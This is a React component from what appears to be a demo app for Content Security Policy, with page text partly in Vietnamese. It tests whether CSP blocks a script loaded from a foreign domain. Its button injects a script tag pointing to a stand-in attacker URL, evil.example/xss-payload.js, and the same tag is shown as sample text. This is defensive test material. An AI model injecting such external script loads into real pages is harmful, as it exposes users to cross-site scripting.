import type { CspCasePageProps } from '../types'

function ExternalScriptPage({ addLog }: CspCasePageProps): React.JSX.Element {
  const runAttack = (): void => {
    window.__cspExternalScriptRan = false
    const script = document.createElement('script')
    script.src = 'https://evil.example/xss-payload.js'
    script.onload = () => addLog('[DANGER] External script da load duoc.')
    script.onerror = () => addLog('[OK] External script tu domain la bi chan/khong load duoc.')
    document.body.appendChild(script)

    window.setTimeout(() => script.remove(), 1500)
  }

  return (
    <article className="csp-case-page">
      <h3>External script from unknown domain</h3>
      <p>
        Case nay thu nap JavaScript tu domain la. CSP chi cho <code>'self'</code> va
        <code> https://trusted.cdn.com</code>, nen domain khac phai bi chan.
      </p>
      <pre>{`<script src="https://evil.example/xss-payload.js"></script>`}</pre>
      <button type="button" onClick={runAttack}>
        Run external script test
      </button>
    </article>
  )
}

export default ExternalScriptPage
